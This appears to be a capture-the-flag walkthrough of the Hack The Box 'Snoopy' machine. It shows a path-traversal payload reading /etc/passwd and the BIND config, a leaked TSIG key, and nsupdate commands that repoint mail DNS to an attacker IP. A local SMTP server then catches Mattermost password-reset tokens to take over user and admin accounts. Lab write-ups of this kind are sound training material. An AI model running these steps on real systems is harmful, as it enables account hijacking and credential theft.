LFI allowed
http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//etc//passwd

Dig command

`dig axfr @10.129.221.53 snoopy.htb`

```python
┌─[htb-yougotgot@htb-jcv37ftngu]─[~]
└──╼ $dig axfr @10.129.221.53 snoopy.htb 

; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> axfr @10.129.221.53 snoopy.htb
; (1 server found)
;; global options: +cmd
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.		86400	IN	NS	ns1.snoopy.htb.
snoopy.htb.		86400	IN	NS	ns2.snoopy.htb.
mattermost.snoopy.htb.	86400	IN	A	172.18.0.3
mm.snoopy.htb.		86400	IN	A	127.0.0.1
ns1.snoopy.htb.		86400	IN	A	10.0.50.10
ns2.snoopy.htb.		86400	IN	A	10.0.51.10
postgres.snoopy.htb.	86400	IN	A	172.18.0.2
provisions.snoopy.htb.	86400	IN	A	172.18.0.4
www.snoopy.htb.		86400	IN	A	127.0.0.1
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
;; Query time: 12 msec
;; SERVER: 10.129.221.53#53(10.129.221.53) (TCP)
;; WHEN: Tue May 09 19:08:39 BST 2023
;; XFR size: 11 records (messages 1, bytes 325)
```

; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> @10.129.221.5 -y hmac-sha256 -t AXFR snoopy.htb
; (1 server found)
;; global options: +cmd
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
snoopy.htb.		86400	IN	NS	ns1.snoopy.htb.
snoopy.htb.		86400	IN	NS	ns2.snoopy.htb.
mattermost.snoopy.htb.	86400	IN	A	172.18.0.3
mm.snoopy.htb.		86400	IN	A	127.0.0.1
ns1.snoopy.htb.		86400	IN	A	10.0.50.10
ns2.snoopy.htb.		86400	IN	A	10.0.51.10
postgres.snoopy.htb.	86400	IN	A	172.18.0.2
provisions.snoopy.htb.	86400	IN	A	172.18.0.4
www.snoopy.htb.		86400	IN	A	127.0.0.1
snoopy.htb.		86400	IN	SOA	ns1.snoopy.htb. ns2.snoopy.htb. 2022032612 3600 1800 604800 86400
rndc-key.		0	ANY	TSIG	hmac-sha256. 1683648062 300 32 fJV4QGRl0ykbkGD/Y4YCvCwuLG8qzK8nMVEOjGvuo5k= 8174 NOERROR 0

Get this file for any DNS file related transfers with nsupdate:

http://snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//etc//bind/named.conf
/etc/bind/named.conf

key
hmac-sha256:rndc-key:BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=

```python
// This is the primary configuration file for the BIND DNS server named.
//
// Please read /usr/share/doc/bind9/README.Debian.gz for information on the
// structure of BIND configuration files in Debian, *BEFORE* you customize
// this configuration file.
//
// If you are just adding zones, please do that in /etc/bind/named.conf.local

include "/etc/bind/named.conf.options";
include "/etc/bind/named.conf.local";
include "/etc/bind/named.conf.default-zones";

key "rndc-key" {
algorithm hmac-sha256;
secret "BEqUtce80uhu3TOEGJJaMlSx9WT2pkdeCtzBeDykQQA=";
};
```

We have the secret that we can use to tamper with some configurations!

Using nsupdate to update the A record to point at our attack machine 10.10.14.129

https://serverless.industries/2020/09/27/dns-nsupdate-howto.en.html

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9287ba0b-34f0-4405-b11b-876591e60bd8/Untitled.png)

Setting up an smtp server locally

endpoint that can give us the chance to change the password:
*http://mm.snoopy.htb/reset_password*

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/02619a00-2907-4e27-9f00-6ad096a85767/Untitled.png)

Testing and updating TXT records

> server ns1.snoopy.htb
update add snoopy.htb.  900  IN  TXT   "Hello Nerds, how are you going? :-)"
> 

Now if we query it we can see the updated txt

`dig @ns1.snoopy.htb snoopy.htb TXT`

```python
┌─[htb-yougotgot@htb-jcv37ftngu]─[~]
└──╼ $dig @ns1.snoopy.htb snoopy.htb TXT

; <<>> DiG 9.18.12-1~bpo11+1-Debian <<>> @ns1.snoopy.htb snoopy.htb TXT
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 42369
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 1232
; COOKIE: d9225f0a68121c4801000000645a8db6928800ffd1886ec7 (good)
;; QUESTION SECTION:
;snoopy.htb.			IN	TXT

**;; ANSWER SECTION:
snoopy.htb.		900	IN	TXT	"Hello Nerds, how are you going? :-)"**

;; Query time: 12 msec
;; SERVER: 10.129.221.53#53(ns1.snoopy.htb) (UDP)
;; WHEN: Tue May 09 19:15:24 BST 2023
;; MSG SIZE  rcvd: 115
```

snoopy.htb/download?file=....//....//....//....//....//....//....//....//....//....//etc/passwd

Updating the DNS records with **nsupdate** with the key we have retrieved earlier
`nsupdate -t 1 -k press_package/etc/bind/key.key`

**Or wherever the key once downloaded is stored -k or -y for the string of the key**

> update add mail.snoopy.htb. 86400 IN A 10.10.14.129
send
server snoopy.htb
update add mail.snoopy.htb. 86400 IN A 10.10.14.129
send
update add mail.snoopy.htb 86400 IN A 10.10.14.129
> 

Start a smtpd server

`sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.129:25`

And do the update add command and send the reset password on **sbrown@snoopy.htb**

And we have a response as below:

```python
┌─[✗]─[htb-yougotgot@htb-jcv37ftngu]─[~]
└──╼ $sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.129:25
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']
b'MIME-Version: 1.0'
b'Date: Tue, 09 May 2023 22:39:55 +0000'
b'Content-Transfer-Encoding: 8bit'
b'Reply-To: "No-Reply" <no-reply@snoopy.htb>'
b'Message-ID: <cf1ohewtmh36cfyi-1683671995@mm.snoopy.htb>'
b'From: "No-Reply" <no-reply@snoopy.htb>'
b'To: sbrown@snoopy.htb'
b'Auto-Submitted: auto-generated'
b'Precedence: bulk'
b'Subject: [Mattermost] Reset your password'
b'Content-Type: multipart/alternative;'
b' boundary=45361f64e46bcf3d05cd8d529ee8255e9bf14954e9d5d9baf18c26dc1c58'
b'X-Peer: 10.129.221.53'
b''
b'--45361f64e46bcf3d05cd8d529ee8255e9bf14954e9d5d9baf18c26dc1c58'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/plain; charset=UTF-8'
b''
b'Reset Your Password'
b'Click the button below to reset your password. If you didn=E2=80=99t reques='
b't this, you can safely ignore this email.'
b''
b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3Drtkpo='
b'8dwq143odfwmefw5s3akwprdn6pmpmrgdemqj5cikcog3g5zbgj7sawz5d1 )'
b''
b'The password reset link expires in 24 hours.'
b''
b'Questions?'
b'Need help or have questions? Email us at support@snoopy.htb ( support@snoop='
b'y.htb )'
b''
b'=C2=A9 2022 Mattermost, Inc. 530 Lytton Avenue, Second floor, Palo Alto, CA='
b', 94301'
b'--45361f64e46bcf3d05cd8d529ee8255e9bf14954e9d5d9baf18c26dc1c58'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/html; charset=UTF-8'
b''
b''
b''
b''
b'<!doctype html>'
b'<html xmlns=3D"http://www.w3.org/1999/xhtml" xmlns:v=3D"urn:schemas-microso='
b'ft-com:vml" xmlns:o=3D"urn:schemas-microsoft-com:office:office">'
b''
b'<head>'
b'  <title>'
b'  </title>'
b' =20'
b'  <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">'
b' =20'
b'  <meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3DUTF-8">'
b'  <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D='
b'1">'
b'  <style type=3D"text/css">'
b'    #outlook a {'
b'      padding: 0;'
b'    }'
b''
b'    body {'
b'      margin: 0;'
b'      padding: 0;'
b'      -webkit-text-size-adjust: 100%;'
b'      -ms-text-size-adjust: 100%;'
b'    }'
b''
b'    table,'
b'    td {'
b'      border-collapse: collapse;'
b'      mso-table-lspace: 0pt;'
b'      mso-table-rspace: 0pt;'
b'    }'
b''
b'    img {'
b'      border: 0;'
b'      height: auto;'
b'      line-height: 100%;'
b'      outline: none;'
b'      text-decoration: none;'
b'      -ms-interpolation-mode: bicubic;'
b'    }'
b''
b'    p {'
b'      display: block;'
b'      margin: 13px 0;'
b'    }'
b'  </style>'
b' =20'
b' =20'
b' =20'
b'  <link href=3D"https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400='
b',500,700" rel=3D"stylesheet" type=3D"text/css">'
b'  <style type=3D"text/css">'
b'    @import url(https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400='
b',500,700);'
b'  </style>'
b' =20'
b'  <style type=3D"text/css">'
b'    @media only screen and (min-width:480px) {'
b'      .mj-column-per-100 {'
b'        width: 100% !important;'
b'        max-width: 100%;'
b'      }'
b'    }'
b'  </style>'
b'  <style media=3D"screen and (min-width:480px)">'
b'    .moz-text-html .mj-column-per-100 {'
b'      width: 100% !important;'
b'      max-width: 100%;'
b'    }'
b'  </style>'
b'  <style type=3D"text/css">'
b'    @media only screen and (max-width:480px) {'
b'      table.mj-full-width-mobile {'
b'        width: 100% !important;'
b'      }'
b''
b'      td.mj-full-width-mobile {'
b'        width: auto !important;'
b'      }'
b'    }'
b'  </style>'
b'  <style type=3D"text/css">'
b'    @import url(https://fonts.googleapis.com/css?family=3DOpen+Sans:300,400='
b',500,600,700);'
b''
b'    .emailBody {'
b'      background-color: #F3F3F3'
b'    }'
b''
b'    .emailBody a {'
b'      text-decoration: none !important;'
b'      color: #1C58D9;'
b'    }'
b''
b'    .title div {'
b'      font-weight: 600 !important;'
b'      font-size: 28px !important;'
b'      line-height: 36px !important;'
b'      letter-spacing: -0.01em !important;'
b'      color: #3F4350 !important;'
b'      font-family: Open Sans, sans-serif !important;'
b'    }'
b''
b'    .subTitle div {'
b'      font-size: 16px !important;'
b'      line-height: 24px !important;'
b'      color: rgba(63, 67, 80, 0.64) !important;'
b'    }'
b''
b'    .subTitle a {'
b'      color: rgb(28, 88, 217) !important;'
b'    }'
b''
b'    .button a {'
b'      background-color: #1C58D9 !important;'
b'      font-weight: 600 !important;'
b'      font-size: 16px !important;'
b'      line-height: 18px !important;'
b'      color: #FFFFFF !important;'
b'      padding: 15px 24px !important;'
b'    }'
b''
b'    .button-cloud a {'
b'      background-color: #1C58D9 !important;'
b'      font-weight: 400 !important;'
b'      font-size: 16px !important;'
b'      line-height: 18px !important;'
b'      color: #FFFFFF !important;'
b'      padding: 15px 24px !important;'
b'    }'
b''
b'    .messageButton a {'
b'      background-color: #FFFFFF !important;'
b'      border: 1px solid #FFFFFF !important;'
b'      box-sizing: border-box !important;'
b'      color: #1C58D9 !important;'
b'      padding: 12px 20px !important;'
b'      font-weight: 600 !important;'
b'      font-size: 14px !important;'
b'      line-height: 14px !important;'
b'    }'
b''
b'    .info div {'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'      padding: 40px 0px !important;'
b'    }'
b''
b'    .footerTitle div {'
b'      font-weight: 600 !important;'
b'      font-size: 16px !important;'
b'      line-height: 24px !important;'
b'      color: #3F4350 !important;'
b'      padding: 0px 0px 4px 0px !important;'
b'    }'
b''
b'    .footerInfo div {'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'      padding: 0px 48px 0px 48px !important;'
b'    }'
b''
b'    .footerInfo a {'
b'      color: #1C58D9 !important;'
b'    }'
b''
b'    .appDownloadButton a {'
b'      background-color: #FFFFFF !important;'
b'      border: 1px solid #1C58D9 !important;'
b'      box-sizing: border-box !important;'
b'      color: #1C58D9 !important;'
b'      padding: 13px 20px !important;'
b'      font-weight: 600 !important;'
b'      font-size: 14px !important;'
b'      line-height: 14px !important;'
b'    }'
b''
b'    .emailFooter div {'
b'      font-size: 12px !important;'
b'      line-height: 16px !important;'
b'      color: rgba(63, 67, 80, 0.56) !important;'
b'      padding: 8px 24px 8px 24px !important;'
b'    }'
b''
b'    .postCard {'
b'      padding: 0px 24px 40px 24px !important;'
b'    }'
b''
b'    .messageCard {'
b'      background: #FFFFFF !important;'
b'      border: 1px solid rgba(61, 60, 64, 0.08) !important;'
b'      box-sizing: border-box !important;'
b'      box-shadow: 0px 8px 24px rgba(0, 0, 0, 0.12) !important;'
b'      border-radius: 4px !important;'
b'      padding: 32px !important;'
b'    }'
b''
b'    .messageAvatar img {'
b'      width: 32px !important;'
b'      height: 32px !important;'
b'      padding: 0px !important;'
b'      border-radius: 32px !important;'
b'    }'
b''
b'    .messageAvatarCol {'
b'      width: 32px !important;'
b'    }'
b''
b'    .postNameAndTime {'
b'      padding: 0px 0px 4px 0px !important;'
b'      display: flex;'
b'    }'
b''
b'    .senderName {'
b'      font-family: Open Sans, sans-serif;'
b'      text-align: left !important;'
b'      font-weight: 600 !important;'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'    }'
b''
b'    .time {'
b'      font-family: Open Sans, sans-serif;'
b'      font-size: 12px;'
b'      line-height: 16px;'
b'      color: rgba(63, 67, 80, 0.56);'
b'      padding: 2px 6px;'
b'      align-items: center;'
b'      float: left;'
b'    }'
b''
b'    .channelBg {'
b'      background: rgba(63, 67, 80, 0.08);'
b'      border-radius: 4px;'
b'      display: flex;'
b'      padding-left: 4px;'
b'    }'
b''
b'    .channelLogo {'
b'      width: 10px;'
b'      height: 10px;'
b'      padding: 5px 4px 5px 6px;'
b'      float: left;'
b'    }'
b''
b'    .channelName {'
b'      font-family: Open Sans, sans-serif;'
b'      font-weight: 600;'
b'      font-size: 10px;'
b'      line-height: 16px;'
b'      letter-spacing: 0.01em;'
b'      text-transform: uppercase;'
b'      color: rgba(63, 67, 80, 0.64);'
b'      padding: 2px 6px 2px 0px;'
b'    }'
b''
b'    .gmChannelCount {'
b'      background-color: rgba(63, 67, 80, 0.2);'
b'      padding: 0 5px;'
b'      border-radius: 2px;'
b'      margin-right: 2px;'
b'    }'
b''
b'    .senderMessage div {'
b'      text-align: left !important;'
b'      font-size: 14px !important;'
b'      line-height: 20px !important;'
b'      color: #3F4350 !important;'
b'      padding: 0px !important;'
b'    }'
b''
b'    .senderInfoCol {'
b'      width: 394px !important;'
b'      padding: 0px 0px 0px 12px !important;'
b'    }'
b''
b'    @media all and (min-width: 541px) {'
b'      .emailBody {'
b'        padding: 32px !important;'
b'      }'
b'    }'
b''
b'    @media all and (max-width: 540px) and (min-width: 401px) {'
b'      .emailBody {'
b'        padding: 16px !important;'
b'      }'
b''
b'      .messageCard {'
b'        padding: 16px !important;'
b'      }'
b''
b'      .senderInfoCol {'
b'        width: 80% !important;'
b'        padding: 0px 0px 0px 12px !important;'
b'      }'
b'    }'
b''
b'    @media all and (max-width: 400px) {'
b'      .emailBody {'
b'        padding: 0px !important;'
b'      }'
b''
b'      .footerInfo div {'
b'        padding: 0px !important;'
b'      }'
b''
b'      .messageCard {'
b'        padding: 16px !important;'
b'      }'
b''
b'      .postCard {'
b'        padding: 0px 0px 40px 0px !important;'
b'      }'
b''
b'      .senderInfoCol {'
b'        width: 80% !important;'
b'        padding: 0px 0px 0px 12px !important;'
b'      }'
b'    }'
b''
b'    @media only screen and (min-width:480px) {'
b'      .mj-column-per-50 {'
b'        width: 100% !important;'
b'        max-width: 100% !important;'
b'      }'
b'    }'
b'  </style>'
b'</head>'
b''
b'<body style=3D"word-spacing:normal;background-color:#FFFFFF;">'
b'  <div class=3D"emailBody" style=3D"background-color: #FFFFFF;">'
b'   =20'
b'    <div style=3D"background:#FFFFFF;background-color:#FFFFFF;margin:0px au='
b'to;border-radius:8px;max-width:600px;">'
b'      <table align=3D"center" border=3D"0" cellpadding=3D"0" cellspacing=3D='
b'"0" role=3D"presentation" style=3D"background:#FFFFFF;background-color:#FFF='
b'FFF;width:100%;border-radius:8px;">'
b'        <tbody>'
b'          <tr>'
b'            <td style=3D"direction:ltr;font-size:0px;padding:24px;text-alig='
b'n:center;">'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px ='
b'0px 40px 0px;text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" style=3D"font-size:0px='
b';padding:0px;word-break:break-word;">'
b'                                  <table border=3D"0" cellpadding=3D"0" cel='
b'lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:collapse;bord='
b'er-spacing:0px;">'
b'                                    <tbody>'
b'                                      <tr>'
b'                                        <td style=3D"width:132px;">'
b'                                          <img alt height=3D"21" src=3D"htt='
b'p://mm.snoopy.htb/static/images/logo_email_dark.png" style=3D"border:0;disp='
b'lay:block;outline:none;text-decoration:none;height:21.76px;width:100%;font-='
b'size:13px;" width=3D"132">'
b'                                        </td>'
b'                                      </tr>'
b'                                    </tbody>'
b'                                  </table>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px ='
b'24px 40px 24px;text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"title" style='
b'=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"text-align: center; font-we='
b'ight: 600; font-size: 28px; line-height: 36px; letter-spacing: -0.01em; col='
b'or: #3F4350; font-family: Open Sans, sans-serif;">Reset Your Password</div>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"subTitle" sty='
b'le=3D"font-size:0px;padding:16px 24px 16px 24px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 16px; line-height: 24px; color: rgb='
b'a(63, 67, 80, 0.64);">Click the button below to reset your password. If you='
b' didn=E2=80=99t request this, you can safely ignore this email.</div>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" vertical-align=3D"midd='
b'le" class=3D"button" style=3D"font-size:0px;padding:0px;word-break:break-wo='
b'rd;">'
b'                                  <table border=3D"0" cellpadding=3D"0" cel='
b'lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:separate;line='
b'-height:100%;">'
b'                                    <tr>'
b'                                      <td align=3D"center" bgcolor=3D"#FFFF='
b'FF" role=3D"presentation" style=3D"border:none;border-radius:4px;cursor:aut='
b'o;mso-padding-alt:10px 25px;background:#FFFFFF;" valign=3D"middle">'
b'                                        <a href=3D"http://mm.snoopy.htb/res='
b'et_password_complete?token=3Drtkpo8dwq143odfwmefw5s3akwprdn6pmpmrgdemqj5cik='
b'cog3g5zbgj7sawz5d1" style=3D"display: inline-block; background: #FFFFFF; fo='
b'nt-family: Open Sans, sans-serif; margin: 0; text-transform: none; mso-padd='
b'ing-alt: 0px; border-radius: 4px; text-decoration: none; background-color: ='
b'#1C58D9; font-weight: 600; font-size: 16px; line-height: 18px; color: #FFFF='
b'FF; padding: 15px 24px;" target=3D"_blank">'
b'                                          Reset Password'
b'                                        </a>'
b'                                      </td>'
b'                                    </tr>'
b'                                  </table>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px;='
b'text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" style=3D"font-size:0px='
b';padding:0px;word-break:break-word;">'
b'                                  <table border=3D"0" cellpadding=3D"0" cel='
b'lspacing=3D"0" role=3D"presentation" style=3D"border-collapse:collapse;bord='
b'er-spacing:0px;">'
b'                                    <tbody>'
b'                                      <tr>'
b'                                        <td style=3D"width:312px;">'
b'                                          <img alt height=3D"auto" src=3D"h='
b'ttp://mm.snoopy.htb/static/images/forgot_password_illustration.png" style='
b'=3D"border:0;display:block;outline:none;text-decoration:none;height:auto;wi='
b'dth:100%;font-size:13px;" width=3D"312">'
b'                                        </td>'
b'                                      </tr>'
b'                                    </tbody>'
b'                                  </table>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"info" style='
b'=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 14px; line-height: 20px; color: #3F='
b'4350; padding: 40px 0px;">The password reset link expires in 24 hours.</div='
b'>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'             =20'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:16px='
b' 0px 40px 0px;text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"footerTitle" ='
b'style=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-weight: 600; font-size: 16px; line-height='
b': 24px; color: #3F4350; padding: 0px 0px 4px 0px;">Questions?</div>'
b'                                </td>'
b'                              </tr>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"footerInfo" s='
b'tyle=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 14px; line-height: 20px; color: #3F='
b'4350; padding: 0px 48px 0px 48px;">Need help or have questions? Email us at='
b'=20'
b'                                    <a href=3D"mailto:support@snoopy.htb" s='
b'tyle=3D"text-decoration: none; color: #1C58D9;">'
b'                                      support@snoopy.htb</a>'
b'                                  </div>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'             =20'
b'             =20'
b'              <div style=3D"margin:0px auto;max-width:552px;">'
b'                <table align=3D"center" border=3D"0" cellpadding=3D"0" cell='
b'spacing=3D"0" role=3D"presentation" style=3D"width:100%;">'
b'                  <tbody>'
b'                    <tr>'
b'                      <td style=3D"direction:ltr;font-size:0px;padding:0px;='
b'text-align:center;">'
b'                       =20'
b'                        <div class=3D"mj-column-per-100 mj-outlook-group-fi='
b'x" style=3D"font-size:0px;text-align:left;direction:ltr;display:inline-bloc='
b'k;vertical-align:top;width:100%;">'
b'                          <table border=3D"0" cellpadding=3D"0" cellspacing='
b'=3D"0" role=3D"presentation" style=3D"vertical-align:top;" width=3D"100%">'
b'                            <tbody>'
b'                              <tr>'
b'                                <td align=3D"center" class=3D"emailFooter" ='
b'style=3D"font-size:0px;padding:0px;word-break:break-word;">'
b'                                  <div style=3D"font-family: Open Sans, san='
b's-serif; text-align: center; font-size: 12px; line-height: 16px; color: rgb='
b'a(63, 67, 80, 0.56); padding: 8px 24px 8px 24px;">'
b'                                    =C2=A9 2022 Mattermost, Inc. 530 Lytton='
b' Avenue, Second floor, Palo Alto, CA, 94301'
b'                                  </div>'
b'                                </td>'
b'                              </tr>'
b'                            </tbody>'
b'                          </table>'
b'                        </div>'
b'                       =20'
b'                      </td>'
b'                    </tr>'
b'                  </tbody>'
b'                </table>'
b'              </div>'
b'             =20'
b'            </td>'
b'          </tr>'
b'        </tbody>'
b'      </table>'
b'    </div>'
b'   =20'
b'  </div>'
b'</body>'
b''
b'</html>'
b''
b''
b'--45361f64e46bcf3d05cd8d529ee8255e9bf14954e9d5d9baf18c26dc1c58--'
------------ END MESSAGE ------------
```

Token:

**http://mm.snoopy.htb/reset_password_complete?token=3Drtkpo='
b'8dwq143odfwmefw5s3akwprdn6pmpmrgdemqj5cikcog3g5zbgj7sawz5d1**

Modyfying the link and removing some stuff we get to reset the password for 

sbrown: password

**`http://mm.snoopy.htb/reset_password_complete?token=rtkpo8dwq143odfwmefw5s3akwprdn6pmpmrgdemqj5cikcog3g5zbgj7sawz5d1`**

Following the link we get to create a new password and we are inside of mattermost

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/066c709c-8ec5-4a70-b85e-3d7d82bd11fc/Untitled.png)

Only one channel inside of the app

![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/def707a1-8dbe-44d0-abf9-c7d650668968/Untitled.png)

admin address

`admin@local.htb`

Ok now repeated the same for the admin

```python
└──╼ $sudo python3 -m smtpd -n -c DebuggingServer 10.10.14.129:25
---------- MESSAGE FOLLOWS ----------
mail options: ['BODY=8BITMIME']
b'MIME-Version: 1.0'
b'Message-ID: <oax8e5wn8dti446o-1683673887@mm.snoopy.htb>'
b'To: admin@local.htb'
b'Auto-Submitted: auto-generated'
b'Precedence: bulk'
b'Reply-To: "No-Reply" <no-reply@snoopy.htb>'
b'From: "No-Reply" <no-reply@snoopy.htb>'
b'Date: Tue, 09 May 2023 23:11:27 +0000'
b'Subject: [Mattermost] Reset your password'
b'Content-Transfer-Encoding: 8bit'
b'Content-Type: multipart/alternative;'
b' boundary=95146158bc86ec64a316b847ec888561eb404887b1276806c4cc77adda80'
b'X-Peer: 10.129.221.81'
b''
b'--95146158bc86ec64a316b847ec888561eb404887b1276806c4cc77adda80'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/plain; charset=UTF-8'
b''
b'Reset Your Password'
b'Click the button below to reset your password. If you didn=E2=80=99t reques='
b't this, you can safely ignore this email.'
b''
b'Reset Password ( http://mm.snoopy.htb/reset_password_complete?token=3D6xj4k='
b'6o9u751nzr71tmhghan4x958yh66oz43ctqg1bhnn1dmh6e3n4zgg3fkipc )'
b''
b'The password reset link expires in 24 hours.'
b''
b'Questions?'
b'Need help or have questions? Email us at support@snoopy.htb ( support@snoop='
b'y.htb )'
b''
b'=C2=A9 2022 Mattermost, Inc. 530 Lytton Avenue, Second floor, Palo Alto, CA='
b', 94301'
b'--95146158bc86ec64a316b847ec888561eb404887b1276806c4cc77adda80'
b'Content-Transfer-Encoding: quoted-printable'
b'Content-Type: text/html; charset=UTF-8'
b''
b''
b''
b''
b'<!doctype html>'
b'<html xmlns=3D"http://www.w3.org/1999/xhtml" xmlns:v=3D"urn:schemas-microso='
b'ft-com:vml" xmlns:o=3D"urn:schemas-microsoft-com:office:office">'
b''
b'<head>'
b'  <title>'
b'  </title>'
b' =20'
b'  <meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">'
b' =20'
b'  <meta http-equiv=3D"Content-Type" content=3D"text/html; charset=3DUTF-8">'
b'  <meta name=3D"viewport" content=3D"width=3Ddevice-width, initial-scale=3D='
b'1">'
b'  <style type=3D"text/css">'
b'    #outlook a {'
b'      padding: 0;'
b'    }'
b''
b'    body {'
b'      margin: 0;'
b'      padding: 0;'
b'      -webkit-text-size-adjust: 100%;'
b'      -ms-text-size-adjust: 100%;'
b'    }'
b''
b'    table,'
b'    td {'
b'      border-collapse: collapse;'
b'      mso-table-lspace: 0pt;'
b'      mso-table-rspace: 0pt;'
b'    }'
b''
b'    img {'
